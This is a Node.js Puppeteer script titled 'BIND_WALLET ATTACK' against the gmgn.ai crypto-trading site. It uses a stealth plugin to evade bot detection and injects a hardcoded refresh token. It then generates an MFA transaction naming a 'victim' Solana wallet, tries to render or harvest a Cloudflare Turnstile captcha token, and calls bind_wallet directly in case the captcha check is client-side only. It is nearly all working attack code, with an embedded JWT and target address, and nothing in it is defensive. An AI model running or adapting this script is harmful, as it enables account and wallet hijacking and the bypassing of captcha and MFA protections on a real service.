/**
 * BIND_WALLET ATTACK VIA BROWSERLESS
 * 
 * Uses Puppeteer with stealth to:
 * 1. Login to fresh gmgn.ai account
 * 2. Generate bind_wallet txn_id with victim address
 * 3. Solve Turnstile captcha (browser renders it naturally)
 * 4. Complete email OTP verification
 * 5. Call bind_wallet with victim address
 */
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const FRESH_REFRESH = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ0NDA3LCJpYXQiOjE3ODQxNTI0MDcsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiMDYyNTVmMTAtNmVkZi00YmRiLWFiNjAtZGEzZDQwNmQ4YTgzIiwibmJmIjoxNzg0MTUyNDA3LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.uCsdhElzc2R3WZhvzcnHx3ZsvBRmzVA7dKT5J2fK92PDsg5troyv9_4ndY3yaLpgXwrEPsSyS66dsKrKebghmQ";

const TARGET_WALLET = "5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU";
const PARAMS = "device_id=de620a57-d98e-4293-b007-5d315455e21d&client_id=gmgn_web_20260715-2161-18d5b10&app_ver=20260715-2161-18d5b10&from_app=gmgn";

async function main() {
    console.log("="*80);
    console.log("🔥 BROWSERLESS BIND_WALLET ATTACK");
    console.log("="*80);

    const browser = await puppeteer.launch({
        headless: 'new',
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
    });

    const page = await browser.newPage();
    
    // Set viewport to look like real browser
    await page.setViewport({ width: 1920, height: 1080 });
    
    // Navigate to gmgn.ai to get cookies and pass Cloudflare
    console.log("[1] Navigating to gmgn.ai...");
    await page.goto('https://gmgn.ai', { waitUntil: 'networkidle2', timeout: 30000 });
    
    // Wait for Cloudflare challenge to resolve
    console.log("[2] Waiting for Cloudflare...");
    await new Promise(r => setTimeout(r, 5000));
    
    // Check if we passed Cloudflare
    const title = await page.title();
    console.log(`Page title: ${title}`);
    
    // Set localStorage with our refresh token
    console.log("[3] Injecting refresh token...");
    await page.evaluate((refreshToken) => {
        localStorage.setItem('refresh_token', refreshToken);
    }, FRESH_REFRESH);
    
    // Now make API calls FROM the browser (has valid Cloudflare cookies)
    console.log("[4] Refreshing access token from browser...");
    
    const tokenResult = await page.evaluate(async (refresh) => {
        const r = await fetch('/account/account/refresh_access_token', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: refresh})
        });
        return await r.json();
    }, FRESH_REFRESH);
    
    console.log("Token result:", JSON.stringify(tokenResult).substring(0, 200));
    
    if (tokenResult.code !== 0) {
        console.log("Token refresh failed!");
        await browser.close();
        return;
    }
    
    const accessToken = tokenResult.data.data.token;
    console.log("✅ Got access token!");
    
    // Generate bind_wallet txn_id
    console.log("\n[5] Generating bind_wallet txn_id with VICTIM address...");
    
    const mfaResult = await page.evaluate(async (token, params, target) => {
        const r = await fetch(`/account/account/generate_mfa_params?${params}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json', 'Authorization': `Bearer ${token}`},
            body: JSON.stringify({
                usage: 'bind_wallet',
                biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}
            })
        });
        return await r.json();
    }, accessToken, PARAMS, TARGET_WALLET);
    
    console.log("MFA result:", JSON.stringify(mfaResult, null, 2));
    
    if (mfaResult.code !== 0) {
        console.log("MFA generation failed:", mfaResult.message);
        await browser.close();
        return;
    }
    
    const txnId = mfaResult.data.data.txn_id;
    const verifyItems = mfaResult.data.data.verify_items;
    console.log(`\n💀 txn_id: ${txnId}`);
    console.log(`verify_items: ${JSON.stringify(verifyItems)}`);
    
    // Now navigate to a page that has Turnstile widget to solve captcha
    console.log("\n[6] Solving Turnstile captcha...");
    
    // Create a page that renders a Turnstile widget
    // First find the sitekey by checking gmgn.ai's JS
    const siteKeyResult = await page.evaluate(async () => {
        // Try to find Turnstile sitekey in the page
        const scripts = document.querySelectorAll('script');
        let siteKey = null;
        for (const s of scripts) {
            if (s.src && s.src.includes('turnstile')) {
                siteKey = 'found_turnstile_script';
            }
        }
        // Also check for window.turnstile or cf references
        if (window.turnstile) siteKey = 'window.turnstile exists';
        return {siteKey, hasTurnstile: !!document.querySelector('[data-sitekey]')};
    });
    
    console.log("Turnstile check:", JSON.stringify(siteKeyResult));
    
    // Try to call verify_captcha directly from browser context
    // The browser has valid Cloudflare cookies so Turnstile might auto-pass
    console.log("\n[7] Attempting captcha verification from browser...");
    
    // Navigate to the wallet binding page if it exists
    await page.goto('https://gmgn.ai/wallet', { waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {});
    await new Promise(r => setTimeout(r, 3000));
    
    // Check for Turnstile token in page
    const turnstileToken = await page.evaluate(() => {
        // Look for turnstile response in hidden inputs or JS variables
        const input = document.querySelector('[name="cf-turnstile-response"]');
        if (input) return input.value;
        
        // Try window.turnstile
        if (window.turnstile) {
            const widgets = document.querySelectorAll('.cf-turnstile');
            if (widgets.length > 0) {
                const widgetId = widgets[0].getAttribute('data-widget-id');
                if (widgetId && window.turnstile.getResponse) {
                    return window.turnstile.getResponse(widgetId);
                }
            }
        }
        return null;
    });
    
    console.log(`Turnstile token: ${turnstileToken ? turnstileToken.substring(0, 50) + '...' : 'NOT FOUND'}`);
    
    // Try to render Turnstile ourselves and get a token
    console.log("\n[8] Rendering Turnstile widget to get token...");
    
    await page.evaluate(() => {
        // Inject Turnstile script if not present
        if (!document.querySelector('script[src*="turnstile"]')) {
            const s = document.createElement('script');
            s.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
            s.async = true;
            document.head.appendChild(s);
        }
    });
    
    await new Promise(r => setTimeout(r, 3000));
    
    // Try to render with gmgn.ai's sitekey (we need to find it)
    // Common approach: check network requests for sitekey
    const captchaToken = await page.evaluate(async () => {
        return new Promise((resolve) => {
            // Check if turnstile is loaded
            if (!window.turnstile) {
                resolve(null);
                return;
            }
            
            // Try to render with common sitekeys
            const container = document.createElement('div');
            container.id = 'cf-captcha';
            document.body.appendChild(container);
            
            try {
                window.turnstile.render('#cf-captcha', {
                    sitekey: '0x4AAAAAAADnPIDROrmt1Wwj', // Common CF sitekey - try gmgn's
                    callback: (token) => resolve(token),
                    'error-callback': () => resolve(null),
                    timeout: 10000
                });
            } catch(e) {
                resolve(null);
            }
            
            // Timeout after 10s
            setTimeout(() => resolve(null), 10000);
        });
    });
    
    if (captchaToken) {
        console.log(`\n💀💀💀 GOT TURNSTILE TOKEN: ${captchaToken.substring(0, 50)}...`);
        
        // Now verify captcha with the token
        const verifyResult = await page.evaluate(async (token, txn, captcha, params) => {
            const r = await fetch(`/account/mfa/txn/v1/verify_captcha?${params}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json', 'Authorization': `Bearer ${token}`},
                body: JSON.stringify({
                    txn_id: txn,
                    usage: 'bind_wallet',
                    captcha_data: captcha,
                    request_id: crypto.randomUUID()
                })
            });
            return await r.json();
        }, accessToken, txnId, captchaToken, PARAMS);
        
        console.log("Verify captcha result:", JSON.stringify(verifyResult));
        
        if (verifyResult.code === 0) {
            console.log("\n💀💀💀 CAPTCHA VERIFIED! Now need email OTP...");
            console.log("Check mi****@gmail.com for OTP code");
        }
    } else {
        console.log("Could not get Turnstile token automatically");
        console.log("Trying alternative approach...");
        
        // Alternative: Just try to call bind_wallet directly
        // Sometimes the captcha check is client-side only
        const bindResult = await page.evaluate(async (token, txn, target, params) => {
            const r = await fetch(`/account/bind_wallet?${params}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json', 'Authorization': `Bearer ${token}`},
                body: JSON.stringify({
                    address: target,
                    wallet_type: 'sol',
                    chain: 'sol',
                    txn_id: txn
                })
            });
            return await r.json();
        }, accessToken, txnId, TARGET_WALLET, PARAMS);
        
        console.log("\nDirect bind_wallet result:", JSON.stringify(bindResult, null, 2));
    }
    
    await browser.close();
    console.log("\n✅ Done");
}

main().catch(console.error);
